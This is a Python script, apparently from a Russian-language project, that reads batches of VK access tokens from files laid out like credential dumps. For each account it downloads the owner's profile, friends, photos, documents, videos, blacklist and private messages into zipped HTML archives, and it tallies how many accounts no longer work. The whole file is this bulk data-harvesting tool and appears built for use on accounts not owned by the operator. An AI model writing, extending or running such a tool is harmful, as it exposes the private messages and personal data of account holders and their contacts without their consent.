import os
import shutil
from time import time

from vk_api.info import get_info
from vk_api.messages import get_messages

from vk_html.index import index_html
from vk_html.page_info import page_info_html
from vk_html.friends import friends_html
from vk_html.gifts import gifts_html
from vk_html.groups import groups_html
from vk_html.black_list import black_list_html
from vk_html.docs import docs_html
from vk_html.photos import photos_html
from vk_html.videos import videos_html
from vk_html.message_list import message_list_html

from stats.stats import logs, urls, errors


tokens = []

for file_name in os.listdir(path="tokens"):
    try:
        f = open('tokens/%s' % file_name, 'r')
        token = f.readline().split(':')[2]
        token = token[:-1:]
        tokens.append(token)
        f.close()
        shutil.move('tokens/%s' % file_name, 'tokens/used')
    except:
        pass

tokens = list(set(tokens))

print('Количество аккаунтов: %s\n\n' % len(tokens))

invalid_count = 0

for (index, token) in enumerate(tokens):
    print(get_messages(token))
    input()
    t = time()

    try:
        info = get_info(token)
        name = '%s %s' % (info['first_name'], info['last_name'])
        url = info['url']
    except Exception as e:
        invalid_count += 1
        logs(token, '-', -1, 0)
        print('Не удалось подключиться к аккаунту\n')
        continue

    try:
        os.mkdir(r'users/%s' % name)
        os.mkdir(r'users/%s/html' % name)
        os.mkdir(r'users/%s/html/messages' % name)
        shutil.copy('html/favicon.ico', 'users/%s/html/favicon.ico' % name)
        shutil.copy('html/style.css', 'users/%s/html/style.css' % name)

        print('Загрузка информации о пользователе № %d (%s)' % (index + 1, name))
        index_html(name, token)
        page_info_html(name, token)
        gifts_html(name, token)
        groups_html(name, token)
        black_list_html(name, token)
        docs_html(name, token)
        photos_html(name, token)
        videos_html(name, token)
        print('Загрузка списка друзей')
        friends_html(name, token)
        print('Загрузка сообщений')
        message_list_html(name, token)

        delta = time() - t
        logs(token, url, delta, 1)
        urls(url)

        f = open('users/%s/Как пользоваться.txt' % name, 'w')
        f.write('''Для того чтобы просмотреть информацию о пользователе %s, откройте файл index.htm, 
если файл не открывается, то нажмите правой кнопкой мыши на файл,
затем пункт "открыть с помощью" и выберите удобный для вас браузер.''' % name)
        f.close()

        shutil.make_archive('users/%s' % name, 'zip', 'users/%s' % name)
        shutil.rmtree('users/%s' % name)

        print('Выполнено за %.2f сек\n' % delta)
    except Exception as e:
        errors(url, e)

print('Из %d аккаунтов %d нерабочих' % (len(tokens), invalid_count))

input()
